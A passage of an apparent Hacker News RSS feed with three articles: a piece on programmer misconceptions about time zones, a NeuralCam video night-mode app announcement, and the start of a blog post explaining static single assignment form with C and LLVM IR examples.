unstandardized.</p><h4 id="iana-zone-keys">IANA zone keys</h4><p>This is as close to the official standard as you can get. It's not at all official, but it's something the developer community has rallied around.</p><p>It's a <a href="https://www.iana.org/time-zones">painstakingly maintained database</a> which contains all known time zone data representing the entire history of local time for places around the globe. &nbsp;It doesn't give any zone a name though, preferring to use the name of the most prominent city in there, which leads to:</p><h4 id="prominent-city-based">Prominent city based</h4><p>This one is "<a href="https://twitter.com/pganssle/status/1319794747876253697">basically bad UI that derives from the IANA zone keys</a>"</p><p>Full time zone names come with naming complications, which we discussed above. If that wasn't enough fun, there's also the political implications of recognizing certain time zones such as Israel Standard Time.</p><p>Some developers took the safer route and identified time zones only by the name of a prominent city in it, not bothering to map it to a common name. That's why the Ubuntu time zone picker makes you select "New York'' instead of Eastern Standard Time.</p><figure><img src="https://www.zainrizvi.io/content/images/2020/10/image-4.png" alt="" srcset="https://www.zainrizvi.io/content/images/size/w600/2020/10/image-4.png 600w, https://www.zainrizvi.io/content/images/2020/10/image-4.png 826w" sizes="(min-width: 720px) 720px"></figure><h4 id="forget-time-zones-use-the-raw-utc-offset">Forget time zones, use the raw UTC offset</h4><p>W3's international standard gave up on the notion of time zones and declared that engineers should only store a timestamp's<a href="https://www.w3.org/TR/NOTE-datetime"> raw UTC offset</a>.</p><h4 id="gps-coordinates">GPS Coordinates</h4><p>Fun fact: Many APIs for getting a region's UTC offset only want a UTC time and latitude/longitude coordinates. This lets them define any moment unambiguously and not have to worry about Daylight Saving Time.</p><p>If you squint your eyes a bit, you could consider this a fourth standard.</p><h3 id="misconception-9-daylight-saving-time-starts-at-the-same-time-every-year">Misconception #9: <strong>Daylight Saving Time starts at the same time every year</strong></h3><p>Did you think this would be the one thing world powers agree on? Each country choose when to start it's own DST</p><h3 id="misconception-10-a-country-s-time-zone-never-changes">Misconception #10: <strong>A country's time zone never changes</strong></h3><p>Almost every year some country will pass a law to edit their time zone.</p><p>In a particularly memorable example, a few years ago the Samoan islands wanted to be on the other side of the international date line to get the same weekends as their Australian trading partners. So on midnight Dec 29th, they changed their UTC offset from -11 to +13 UTC, skipping Dec 30th and going straight to Dec 31st.</p><p>Samoan citizens had one less day to celebrate the holidays that year.</p><p>On the plus side, just 40 miles away the American Samoa Islands stayed on the other side of the international date line. Now Samoans can celebrate new years on the Western Island, and then boat over to American Samoa for a second new year’s party the next night.</p><figure><img src="https://www.zainrizvi.io/content/images/2020/10/pasted-image-0--2-.png" alt="" srcset="https://www.zainrizvi.io/content/images/size/w600/2020/10/pasted-image-0--2-.png 600w, https://www.zainrizvi.io/content/images/size/w1000/2020/10/pasted-image-0--2-.png 1000w, https://www.zainrizvi.io/content/images/2020/10/pasted-image-0--2-.png 1169w" sizes="(min-width: 720px) 720px"></figure><h3 id="misconception-11-a-country-stays-in-the-same-time-zone-during-daylight-saving-time">Misconception #11: <strong>A country stays in the same time zone during Daylight Saving Time</strong></h3><p>Funny thing about DST, it doesn't actually change the time zone's UTC offset. &nbsp;Instead, Daylight Saving Time countries switch to a different time zone, with a different name.</p><p>For example:</p><p>Texas goes from Central Standard Time to Central Daylight Time.</p><p>Chile goes from Chile Standard Time to Chile Summer Time</p><figure><img src="https://www.zainrizvi.io/content/images/2020/10/dst-shift.jpeg" alt="" srcset="https://www.zainrizvi.io/content/images/size/w600/2020/10/dst-shift.jpeg 600w, https://www.zainrizvi.io/content/images/size/w1000/2020/10/dst-shift.jpeg 1000w, https://www.zainrizvi.io/content/images/size/w1600/2020/10/dst-shift.jpeg 1600w, https://www.zainrizvi.io/content/images/2020/10/dst-shift.jpeg 2168w" sizes="(min-width: 720px) 720px"></figure><h3 id="misconception-12-daylight-saving-time-starts-around-march-and-ends-around-october">Misconception #12: <strong>Daylight Saving Time starts around March and ends around October</strong></h3><p>The Southern hemisphere has their summer in the other half of the year. The pattern flips.</p><h3 id="misconception-13-every-time-zone-has-it-s-own-name">Misconception #13: <strong>Every time zone has it’s own name</strong></h3><p>Which country should get to claim "Eastern Standard Time"?</p><p>North America claimed dibs by virtue of inventing the name, but do you think no one objected? Australia thought it sounded like a fine name to use, and so even though the rest of the world refer to their time zone as Australian Eastern Standard Time, it's own citizens just call it "Eastern Standard Time".</p><h3 id="misconception-14-every-time-zone-has-its-own-abbreviation">Misconception #14: <strong>Every time zone has its own abbreviation</strong></h3><p>Which of these was meant when someone says CST?</p><ul><li>Central Standard Time</li><li>China Standard Time</li><li>Cuba Standard Time</li></ul><p>And remember how the time zone name changes during Daylight Saving Time? Many people don’t know that and keep using the wrong abbreviations during DST months. CST might be used for Central Daylight Time.</p><p>If there's no standard name for time zones, can you really expect one for the abbreviations?</p><figure><img src="https://www.zainrizvi.io/content/images/2020/10/fake-franks.jpeg" alt="" srcset="https://www.zainrizvi.io/content/images/size/w600/2020/10/fake-franks.jpeg 600w, https://www.zainrizvi.io/content/images/size/w1000/2020/10/fake-franks.jpeg 1000w, https://www.zainrizvi.io/content/images/2020/10/fake-franks.jpeg 1020w" sizes="(min-width: 720px) 720px"></figure><h3 id="misconception-15-there-is-always-an-unambiguous-conversion-from-one-time-zone-to-another">Misconception #15: <strong>There is always an unambiguous conversion from one time zone to another</strong></h3><p>If I say I want to convert 5pm Eastern Standard Time to Pakistan Standard Time, <s>am I talking about the American or Australian Eastern Standard Time?</s> (Aussies <a href="https://www.reddit.com/r/programming/comments/jggx3l/falsehoods_programmers_believe_about_time_zones/g9qv6cc/">are claiming</a> they say the full Australian Eastern Standard Time)</p><p>And is Daylight Saving Time in effect or not?</p><p>Okay, it’s tricky. But surely if we include the date and the exact city, then we'd be able to do the conversion reliably, right?</p><p>What if the date and time are 1:30 am on Nov 1st, 2020, right when US DST ends and the clock moves backwards?</p><p>1:30am occurs twice that morning, how do you know which instance was intended?</p><figure><img src="https://www.zainrizvi.io/content/images/2020/10/deja-vu.jpeg" alt="" srcset="https://www.zainrizvi.io/content/images/size/w600/2020/10/deja-vu.jpeg 600w, https://www.zainrizvi.io/content/images/size/w1000/2020/10/deja-vu.jpeg 1000w, https://www.zainrizvi.io/content/images/2020/10/deja-vu.jpeg 1474w" sizes="(min-width: 720px) 720px"></figure><h3 id="misconception-16-your-time-zone-library-can-recognize-any-time-zone-you-are-using-a-library-for-this-right-">Misconception #16: <strong>Your time zone library can recognize any time zone (you are using a library for this, right?)</strong></h3><p>Remember all those different potential time zone names and formats? Most libraries will only support one.</p><p>And they might be limited by the time zones installed on your local machine.</p><p>Yeah, really.</p><p>Remember, if time zones can change based on the whims of a local government, then the library will need some external dataset to base its calculations off of. That external dataset just might be the time zones installed on your PC.</p><h3 id="misconception-17-the-entire-country-always-shifts-during-daylight-saving-time">Misconception #17: <strong>The entire country always shifts during Daylight Saving Time</strong></h3><p>In the US, Arizona doesn't practice Daylight Saving Time</p><figure><img src="https://www.zainrizvi.io/content/images/2020/10/arizona-dst.jpeg" alt="" srcset="https://www.zainrizvi.io/content/images/size/w600/2020/10/arizona-dst.jpeg 600w, https://www.zainrizvi.io/content/images/size/w1000/2020/10/arizona-dst.jpeg 1000w, https://www.zainrizvi.io/content/images/2020/10/arizona-dst.jpeg 1575w" sizes="(min-width: 720px) 720px"></figure><h3 id="misconception-18-the-entire-state-always-shifts-during-daylight-saving-time">Misconception #18: <strong>The entire state always shifts during Daylight Saving Time</strong></h3><p>Within Arizona, the Navajo Nation happily follows Daylight Saving Time</p><figure><img src="https://www.zainrizvi.io/content/images/2020/10/navajo-nation.jpeg" alt="" srcset="https://www.zainrizvi.io/content/images/size/w600/2020/10/navajo-nation.jpeg 600w, https://www.zainrizvi.io/content/images/2020/10/navajo-nation.jpeg 760w" sizes="(min-width: 720px) 720px"></figure><h3 id="misconception-19-other-than-dst-every-city-within-a-state-follows-the-same-time-zone">Misconception #19: <strong>Other than DST, every city within a state follows the same time zone</strong></h3><p>In Indiana, USA, most cities follow Eastern Standard Time but a few decided to follow Central Standard Time</p><h3 id="misconception-20-every-city-sits-within-exactly-one-time-zone">Misconception #20: <strong>Every city sits within exactly one time zone</strong></h3><p>A few times in history, state line or time zone lies got drawn without …</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.zainrizvi.io/blog/falsehoods-programmers-believe-about-time-zones/">https://www.zainrizvi.io/blog/falsehoods-programmers-believe-about-time-zones/</a></em></p>]]>
            </description>
            <link>https://www.zainrizvi.io/blog/falsehoods-programmers-believe-about-time-zones/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24870376</guid>
            <pubDate>Fri, 23 Oct 2020 15:18:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[On Our Abusive Relationship with Mozilla’s Firefox]]>
            </title>
            <description>
<![CDATA[
Score 88 | Comments 115 (<a href="https://news.ycombinator.com/item?id=24869658">thread link</a>) | @zdw
<br/>
October 23, 2020 | https://ruzkuku.com/txt/moz-rel.html | <a href="https://web.archive.org/web/*/https://ruzkuku.com/txt/moz-rel.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://ruzkuku.com/txt/moz-rel.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24869658</guid>
            <pubDate>Fri, 23 Oct 2020 14:09:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Video Night Mode with real-time AI-powered denoising and frame boosting]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24869657">thread link</a>) | @soonpls
<br/>
October 23, 2020 | https://neural.cam/news/nightvideo/ | <a href="https://web.archive.org/web/*/https://neural.cam/news/nightvideo/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  <div id="main">
    <div>
      <div>
        <div role="article">

          <div>
            

<p>Hey everyone, <br>

for the past few months we have been working on a new product, and today we’re finally ready to show it to you.
</p>

<div><p>As you probably know, at NeuralCam we have a <a href="https://apps.apple.com/us/app/neuralcam-nightmode/id1474856599" target="_blank">photo NightMode app</a> that’s recognized as the leading night mode solution for iPhones without a built-in photo Night Mode. Ever since the launch of our night mode app, a question kept popping up from our users: <i>“can you build a night mode app for video?”</i>, they asked. 
</p><p>

We’ve pondered this for a while. Unlike photography, there is no obvious straightforward way to build night mode for video. In the case of photos, night mode usually means taking multiple shots with relatively long exposure and combining them into one high quality image. Then brightening and post-processing it for a final look. 

 </p></div>



<p><b>Video</b> is a different beast: you can’t just shoot multiple frames and combine them because you’re limited by both the maximum exposure time a frame can have and by the maximum processing time per frame (milliseconds instead of seconds in the case of real-time video). 

</p>

<p>Clearly, a very different approach is needed. We’ve explored everything from classic to AI-powered video processing techniques and we think we found the right mix of tech that results in much improved low light videos. After months of researching, hacking and developing, we’re proud to present NeuralCam NightVideo, our (and perhaps the world’s first) <b>Video Night Mode</b> app.

</p>
<p><img src="https://neural.cam/news/nightvideo/content/nvid.png">
</p>
<br>

<h3 id="when-they-ghost-mid-project">Night Mode Video</h3>

<p>So how can we build Video NightMode? Where do we get started and why can’t we just take a normal video and brighten it up? Well, because it would look really bad.
</p>

<p>The biggest problem in low light videography (and photography for that matter) is the presence of noise. There’s just too little amount of light hitting the image sensor and this lack of information results in a flickering mess of pixels with different light intensities and colors appearing especially in the darker areas of the scene - not a pleasant view.
</p>
<p>In the case of the photography night mode, this noise is reduced by the mentioned frame merging process - which basically results in more information being added to the target frame. However, with video we don’t have the luxury of multiple frames and processing for seconds to do the processing so we’ll clearly have to find a very different approach. 

</p><h3 id="when-they-ghost-mid-project">Capturing and AI frame-boosting</h3>

<p>The first thing we’re doing is to try to capture the most light inside each frame, which naturally results in less noisy frames. 

</p>

<p>As a standard practice, videos are shot at a shutter speed of no more than 1/24 to keep moving objects sharp and the video smooth. But this also means that this is the maximum amount of time that light can reach the sensor.
</p>

<p>We’ve looked very closely at this problem and figured that there might be a way to let more light in while maintaining the smooth look of the video, namely a combination of longer exposure times and frame interpolation. This way we can use exposure times longer than 1/24 depending on the amount of available light, and then in order to keep the video looking smooth, we generate additional frames using a proprietary Machine Learning powered Video Interpolation algorithm that we’ve built especially for this purpose.</p>

<p>
 The result is a smooth video with a tiny amount of blur - depending on the used settings - and generally a nice “night video” look.

</p>

<p><img src="https://neural.cam/news/nightvideo/content/interp.png">
<br>
</p>



<h3 id="when-they-ghost-mid-project">AI Powered Video Denoising</h3>


<p>Doing the capturing part this way we’ve got higher quality frames, but these generally still have a lot of noise so what we’ll do next is to try to get rid of that.
</p>

<p>It turns out that classic denoising methods aren’t good enough for this case, they usually blur the whole image, including edges and are helpless at the noise levels present in low light shots taken with a smartphone camera. Also, they’re quite slow as well.
</p>

<p>To solve this problem we’ve built a Machine Learning-based denoising algorithm. Specially developed for the iPhone camera, it removes even the heaviest noise and does so selectively and adaptively only on the areas of the image where noise is present. The result is a much cleaner look in the bright areas of the video and a massive reduction of the ugly flickering effect in the darker parts of the image. 
</p>
<p> <video width="700" autoplay="" muted="" no-controls="" loop=""> 
<source src="https://neural.cam/news/nightvideo/content/denoise.mp4" type="video/mp4">
Your browser does not support the video tag.</video>
<br>
</p>

<h3>Brightening</h3>


<p>As a final step after the capturing, interpolation and denoising, it’s finally possible to brighten up the image and get a good looking, smooth video as the result. The amount of brightening applied depends on the selected mode.</p>

<h3>Different Video Night Modes</h3>


<p>As a final step after the capturing, interpolation and denoising, it’s finally possible to brighten up the image and get a good looking, smooth video as the result. The amount of brightening applied depends on the selected mode.</p>
<p> <video width="700" autoplay="" muted="" no-controls="" loop=""> 
<source src="https://neural.cam/news/nightvideo/content/nightvideo.mp4" type="video/mp4">
Your browser does not support the video tag.</video>
<br>
</p>
<p>In order to cover as many shooting situations as possible we’ve come up with 5 different capture modes:

</p>



<h4>Day:
</h4>



<p>The first capturing mode is not even a night mode at all. It is targeted at lower light day shots, or scenes with high dynamic range where the results of the default iPhone camera start to get too noisy. This mode contains no brightening, but because of the use of our AI denoising algorithm, resulting videos have a cleaner, more pleasant look. It’s especially useful when used with the ultra wide camera, in the case of which noise can appear even in medium-lit indoor situations.

</p>

<h4>Dusk:</h4>

<p>
  
  This mode is designed for semi-low light. It is similar to Day mode, shot at a high frame rate to maintain sharp subjects in high movement situations, but in addition to denoising it also includes a bit of additional brightening. 

</p>
<h4>
Night:
</h4>

<p>The “Night” mode is the default mode for shooting night videos. It uses a slightly longer exposure time, that combined with our denoising and frame interpolation algorithms generates a bright, clean and smooth night video. This is the mode to use for most night scenes. 
</p>

<p> <video width="700" autoplay="" muted="" no-controls="" loop=""> 
<source src="https://neural.cam/news/nightvideo/content/building.mp4" type="video/mp4">
Your browser does not support the video tag.</video>
<br>
</p>


<h4>Night+:</h4>

<p>A further enhanced mode for really dark scenes. In this mode, videos have an additional amount of blur but provide a brighter night video with the same clean noise-less look. In most of these situations the built-in camera can't produce usable results.

</p>

<h4>Time-lapse:</h4>

<p>A Night Time-lapse mode, similar to the one on the new iPhone 12 default camera - now made available by NeuralCam NightVideo for older iPhones too. This mode doesn’t have sound and can handle even lower light situations, which combined with a faster playback, generates the specific night mode time-lapse look. 

</p>

<p> <video width="700" autoplay="" muted="" no-controls="" loop=""> 
<source src="https://neural.cam/news/nightvideo/content/timelapse.mp4" type="video/mp4">
Your browser does not support the video tag.</video>
<br>
</p>

<h4>*Gentle Light:</h4>

<p>Each of the modes can be combined with the “gentle light” feature, where the app turns on the flashlight, but at one of the lowest levels in order to keep the resulting video still natural and avoid “blinding” people. Gentle light can be used in totally dark scenes with subjects that are close enough to be illuminated by a small amount of light.
</p>

<h3>Real-time on-device processing</h3>

<p>All this processing runs in real-time on the iPhone, making full use of the power the NeuralEngine provides. This real-time processing means that we can provide the same instant video capturing experience you’re used to with your default camera - tap to capture and everything is displayed and processed on the fly. Since this level of video processing requires quite some processing power, NightVideo is only available on devices with the A12 NeuralEngine (iPhone XR and later) and iOS 14.


</p><p>

  With real-time processing and modes covering everything from slightly low light settings to really dark scenes, NeuralCam NightVideo is the first app to provide Night Mode for Video.
</p>


<div><p>You can purchase the NeuralCam NightVideo app from the App Store, using the link below. Make sure to send us all your feedback over at <a href="mailto:hello@neural.cam">hello@neural.cam</a> - we'd love to hear from you.</p></div>

</div></div></div></div></div></div></div>]]>
            </description>
            <link>https://neural.cam/news/nightvideo/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24869657</guid>
            <pubDate>Fri, 23 Oct 2020 14:09:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Understanding static single assignment forms]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 3 (<a href="https://news.ycombinator.com/item?id=24869227">thread link</a>) | @woodruffw
<br/>
October 23, 2020 | https://blog.yossarian.net/2020/10/23/Understanding-static-single-assignment-forms | <a href="https://web.archive.org/web/*/https://blog.yossarian.net/2020/10/23/Understanding-static-single-assignment-forms">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">


<h2><em>Programming, philosophy, pedaling.</em></h2>

<ul>
    <li><a href="https://blog.yossarian.net/">Home</a></li>
    <li><a href="https://blog.yossarian.net/tags">Tags</a></li>
    <li><a href="https://blog.yossarian.net/favorites">Favorites</a></li>
    <li><a href="https://blog.yossarian.net/archive">Archive</a></li>
    
      <li><a href="https://yossarian.net/">Main Site</a></li>
    
</ul>

<hr>



<h2>
  <em>Oct 23, 2020</em>
</h2>

  <p>Tags:
  
    
    <a href="https://blog.yossarian.net/tags#llvm">llvm</a>,
    
  
    
    <a href="https://blog.yossarian.net/tags#programming">programming</a>
    
  
  </p>


<p><em>With thanks to <a href="https://twitter.com/inventednight/">Niki Carroll</a>, winny, and kurufu for their
invaluable proofreading and advice.</em></p>

<h2 id="preword">Preword</h2>

<p>By <a href="https://twitter.com/8x5clPW2/status/1311316978703970307">popular demand</a>, I’m doing another
LLVM post. This time, it’s <strong>single static assignment</strong> (or SSA) form, a common feature
in the intermediate representations of optimizing compilers.</p>

<p>Like <a href="https://blog.yossarian.net/2020/09/19/LLVMs-getelementptr-by-example">the last one</a>, SSA is a
topic in compiler and IR design that I <em>mostly</em> understand but could benefit from some self-guided
education on. So here we are.</p>

<h2 id="how-to-represent-a-program">How to represent a program</h2>

<p>At the highest level, a compiler’s job is singular: to turn some source language <em>input</em>
into some machine language <em>output</em>. Internally, this breaks down into a sequence of clearly
delineated<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup> tasks:</p>

<ol>
  <li><strong>Lexing</strong> the source into a sequence of tokens</li>
  <li><strong>Parsing</strong> the token stream into an <strong>abstract syntax tree</strong>, or AST<sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup></li>
  <li><strong>Validating</strong> the AST (e.g., ensuring that all uses of identifiers are consistent with the
source language’s scoping and definition rules)<sup id="fnref:3" role="doc-noteref"><a href="#fn:3">3</a></sup></li>
  <li><strong>Translating</strong> the AST into machine code, with all of its complexities (instruction selection,
register allocation, frame generation, &amp;c)</li>
</ol>

<p>In a <strong>single-pass</strong> compiler, (4) is monolithic: machine code is generated as the compiler walks
the AST, with no revisiting of previously generated code. This is extremely fast (in terms of
compiler performance) in exchange for some a few significant limitations:</p>

<ul>
  <li>
    <p>Optimization potential: because machine code is generated in a single pass, it can’t be revisited
for optimizations. Single-pass compilers tend to generate extremely slow and <em>conservative</em>
machine code.</p>

    <p>By way of example: the
  <a href="https://raw.githubusercontent.com/wiki/hjl-tools/x86-psABI/x86-64-psABI-1.0.pdf">System V ABI</a>
  (used by Linux and macOS) defines
  <a href="https://en.wikipedia.org/wiki/Red_zone_(computing)">a special 128-byte region</a> beyond the
  current stack pointer (<code>%rsp</code>) that can be used by leaf functions whose stack frames fit within
  it. This, in turn, saves a few stack management instructions in the function prologue and
  epilogue.</p>

    <p>A single-pass compiler will struggle to take advantage of this ABI-supplied
  optimization: it needs to emit a stack slot for each automatic variable as they’re visited,
  and cannot revisit its function prologue for erasure if all variables fit within the red zone.</p>
  </li>
  <li>
    <p>Language limitations: single-pass compilers struggle with common language design decisions, like
allowing use of identifiers before their declaration or definition. For example, the following
is valid C++:</p>

    <div><div><pre><code>  <span>class</span> <span>Rect</span> <span>{</span>
  <span>public:</span>
    <span>int</span> <span>area</span><span>()</span> <span>{</span> <span>return</span> <span>width</span><span>()</span> <span>*</span> <span>height</span><span>();</span> <span>}</span>
    <span>int</span> <span>width</span><span>()</span> <span>{</span> <span>return</span> <span>5</span><span>;</span> <span>}</span>
    <span>int</span> <span>height</span><span>()</span> <span>{</span> <span>return</span> <span>5</span><span>;</span> <span>}</span>
  <span>};</span>
</code></pre></div>    </div>

    <p>C and C++ <em>generally</em> require pre-declaration and/or definition for identifiers, but
  member function bodies may reference the entire class scope. This will frustrate a
  single-pass compiler, which expects <code>Rect::width</code> and <code>Rect::height</code> to already exist
  in some symbol lookup table for call generation.</p>
  </li>
</ul>

<p>Consequently, (virtually) all modern compilers are <strong>multi-pass</strong>.</p>

<p><img src="https://blog.yossarian.net/assets/multipass.jpg" alt="Pictured: Leeloo Dallas from The Fifth Element holding up her multi-pass.">
<em>“multi-pass” — Leeloo Dallas</em></p>

<p>Multi-pass compilers break the <em>translation</em> phase down even more:</p>

<ol>
  <li>The AST is lowered into an <strong>intermediate representation</strong>, or IR</li>
  <li>Analyses (or passes) are performed on the IR, refining it according to some optimization
profile (code size, performance, &amp;c)</li>
  <li>The IR is either translated to machine code <em>or</em> lowered to <em>another</em> IR, for further target
specialization or optimization<sup id="fnref:4" role="doc-noteref"><a href="#fn:4">4</a></sup></li>
</ol>

<p>So, we want an IR that’s easy to <em>correctly</em> transform and that’s amenable to optimization. Let’s
talk about why IRs that have the <strong>static single assignment</strong> property fill that niche.</p>

<h2 id="ssa-form">SSA form</h2>

<p>At its core, the SSA form of any program source program introduces only one new constraint:
all variables are assigned (i.e., stored to) <strong>exactly once</strong>.</p>

<p>By way of example: the following (not actually very helpful) function is <strong>not</strong> in a valid SSA form
with respect to the <code>flags</code> variable:</p>

<div><div><pre><code><span>int</span> <span>helpful_open</span><span>(</span><span>char</span> <span>*</span><span>fname</span><span>)</span> <span>{</span>
  <span>int</span> <span>flags</span> <span>=</span> <span>O_RDWR</span><span>;</span>

  <span>if</span> <span>(</span><span>!</span><span>access</span><span>(</span><span>fname</span><span>,</span> <span>F_OK</span><span>))</span> <span>{</span>
    <span>flags</span> <span>|=</span> <span>O_CREAT</span><span>;</span>
  <span>}</span>

  <span>int</span> <span>fd</span> <span>=</span> <span>open</span><span>(</span><span>fname</span><span>,</span> <span>flags</span><span>,</span> <span>0644</span><span>);</span>

  <span>return</span> <span>fd</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>Why? Because <code>flags</code> is stored to twice: once for initialization, and (potentially) again inside
the conditional body.</p>

<p>As programmers, we could rewrite <code>helpful_open</code> to only ever store once to each automatic variable:</p>

<div><div><pre><code><span>int</span> <span>helpful_open</span><span>(</span><span>char</span> <span>*</span><span>fname</span><span>)</span> <span>{</span>
  <span>if</span> <span>(</span><span>!</span><span>access</span><span>(</span><span>fname</span><span>,</span> <span>F_OK</span><span>))</span> <span>{</span>
    <span>int</span> <span>flags</span> <span>=</span> <span>O_RDWR</span> <span>|</span> <span>O_CREAT</span><span>;</span>
    <span>return</span> <span>open</span><span>(</span><span>fname</span><span>,</span> <span>flags</span><span>,</span> <span>0644</span><span>);</span>
  <span>}</span> <span>else</span> <span>{</span>
    <span>int</span> <span>flags</span> <span>=</span> <span>O_RDWR</span><span>;</span>
    <span>return</span> <span>open</span><span>(</span><span>fname</span><span>,</span> <span>flags</span><span>,</span> <span>0644</span><span>);</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>But this is clumsy and repetitive: we essentially need to duplicate every chain of uses that
follow any variable that is stored to more than once. That’s not great for readability,
maintainability, or code size.</p>

<p>So, we do what we always do: make the compiler do the hard work for us. Fortunately there exists
a transformation from every valid program into an equivalent SSA form, conditioned on two simple
rules.</p>

<blockquote>
  <p>Rule #1: Whenever we see a store to an already-stored variable, we replace it with a brand
new “version” of that variable.</p>
</blockquote>

<p>Using rule #1 and the example above, we can rewrite <code>flags</code> using <code>_N</code> suffixes to indicate versions:</p>

<div><div><pre><code><span>int</span> <span>helpful_open</span><span>(</span><span>char</span> <span>*</span><span>fname</span><span>)</span> <span>{</span>
  <span>int</span> <span>flags_0</span> <span>=</span> <span>O_RDWR</span><span>;</span>

  <span>// Declared up here to avoid dealing with C scopes.</span>
  <span>int</span> <span>flags_1</span><span>;</span>
  <span>if</span> <span>(</span><span>!</span><span>access</span><span>(</span><span>fname</span><span>,</span> <span>F_OK</span><span>))</span> <span>{</span>
    <span>flags_1</span> <span>=</span> <span>flags_0</span> <span>|</span> <span>O_CREAT</span><span>;</span>
  <span>}</span>

  <span>int</span> <span>fd</span> <span>=</span> <span>open</span><span>(</span><span>fname</span><span>,</span> <span>flags_1</span><span>,</span> <span>0644</span><span>);</span>

  <span>return</span> <span>fd</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>But wait a second: we’ve made a mistake!</p>

<ul>
  <li><code>open(..., flags_1, ...)</code> is incorrect: it unconditionally assigns <code>O_CREAT</code>, which wasn’t in the
original function semantics.</li>
  <li><code>open(..., flags_0, ...)</code> is <strong>also</strong> incorrect: it <em>never</em> assigns <code>O_CREAT</code>, and thus
is wrong for the same reason.</li>
</ul>

<p>So, what do we do? We use rule 2!</p>

<blockquote>
  <p>Rule #2: Whenever we need to <em>choose</em> a variable based on control flow, we use the Phi function
(φ) to introduce a <strong>new</strong> variable based on our choice.</p>
</blockquote>

<p>Using our example once more:</p>

<div><div><pre><code><span>int</span> <span>helpful_open</span><span>(</span><span>char</span> <span>*</span><span>fname</span><span>)</span> <span>{</span>
    <span>int</span> <span>flags_0</span> <span>=</span> <span>O_RDWR</span><span>;</span>

    <span>// Declared up here to avoid dealing with C scopes.</span>
    <span>int</span> <span>flags_1</span><span>;</span>
    <span>if</span> <span>(</span><span>!</span><span>access</span><span>(</span><span>fname</span><span>,</span> <span>F_OK</span><span>))</span> <span>{</span>
      <span>flags_1</span> <span>=</span> <span>flags_0</span> <span>|</span> <span>O_CREAT</span><span>;</span>
    <span>}</span>

    <span>int</span> <span>flags_2</span> <span>=</span> <span>φ</span><span>(</span><span>flags_0</span><span>,</span> <span>flags_1</span><span>);</span>

    <span>int</span> <span>fd</span> <span>=</span> <span>open</span><span>(</span><span>fname</span><span>,</span> <span>flags_2</span><span>,</span> <span>0644</span><span>);</span>

    <span>return</span> <span>fd</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>Our quandary is resolved: <code>open</code> <strong>always</strong> takes <code>flags_2</code>, where <code>flags_2</code> is a fresh SSA variable
produced applying φ to <code>flags_0</code> and <code>flags_1</code>.</p>

<p>Observe, too, that φ is a <strong>symbolic</strong> function: compilers that use SSA forms internally do not
emit real φ functions in generated code<sup id="fnref:5" role="doc-noteref"><a href="#fn:5">5</a></sup>. φ exists <em>solely</em> to reconcile rule #1 with the
existence of control flow.</p>

<p>As such, it’s a little bit silly to talk about SSA forms with C examples (since C and other
high-level languages are what we’re translating from in the first place). Let’s dive into how
LLVM’s IR actually represents them.</p>

<h2 id="ssa-in-llvm">SSA in LLVM</h2>

<p>First of all, let’s see what happens when we run our very first <code>helpful_open</code> through <code>clang</code>
with no optimizations:</p>

<div><div><pre><code><span>define</span> <span>dso_local</span> <span>i32</span> <span>@helpful_open</span><span>(</span><span>i8</span><span>*</span> <span>%fname</span><span>)</span> <span>#0</span> <span>{</span>
<span>entry:</span>
  <span>%fname.addr</span> <span>=</span> <span>alloca</span> <span>i8</span><span>*,</span> <span>align</span> <span>8</span>
  <span>%flags</span> <span>=</span> <span>alloca</span> <span>i32</span><span>,</span> <span>align</span> <span>4</span>
  <span>%fd</span> <span>=</span> <span>alloca</span> <span>i32</span><span>,</span> <span>align</span> <span>4</span>
  <span>store</span> <span>i8</span><span>*</span> <span>%fname</span><span>,</span> <span>i8</span><span>**</span> <span>%fname.addr</span><span>,</span> <span>align</span> <span>8</span>
  <span>store</span> <span>i32</span> <span>2</span><span>,</span> <span>i32</span><span>*</span> <span>%flags</span><span>,</span> <span>align</span> <span>4</span>
  <span>%0</span> <span>=</span> <span>load</span> <span>i8</span><span>*,</span> <span>i8</span><span>**</span> <span>%fname.addr</span><span>,</span> <span>align</span> <span>8</span>
  <span>%call</span> <span>=</span> <span>call</span> <span>i32</span> <span>@access</span><span>(</span><span>i8</span><span>*</span> <span>%0</span><span>,</span> <span>i32</span> <span>0</span><span>)</span> <span>#4</span>
  <span>%tobool</span> <span>=</span> <span>icmp</span> <span>ne</span> <span>i32</span> <span>%call</span><span>,</span> <span>0</span>
  <span>br</span> <span>i1</span> <span>%tobool</span><span>,</span> <span>label</span> <span>%if.end</span><span>,</span> <span>label</span> <span>%if.then</span>

<span>if.then:</span>                                          <span>; preds = %entry</span>
  <span>%1</span> <span>=</span> <span>load</span> <span>i32</span><span>,</span> <span>i32</span><span>*</span> <span>%flags</span><span>,</span> <span>align</span> <span>4</span>
  <span>%or</span> <span>=</span> <span>or</span> <span>i32</span> <span>%1</span><span>,</span> <span>64</span>
  <span>store</span> <span>i32</span> <span>%or</span><span>,</span> <span>i32</span><span>*</span> <span>%flags</span><span>,</span> <span>align</span> <span>4</span>
  <span>br</span> <span>label</span> <span>%if.end</span>

<span>if.end:</span>                                           <span>; preds = %if.then, %entry</span>
  <span>%2</span> <span>=</span> <span>load</span> <span>i8</span><span>*,</span> <span>i8</span><span>**</span> <span>%fname.addr</span><span>,</span> <span>align</span> <span>8</span>
  <span>%3</span> <span>=</span> <span>load</span> <span>i32</span><span>,</span> <span>i32</span><span>*</span> <span>%flags</span><span>,</span> <span>align</span> <span>4</span>
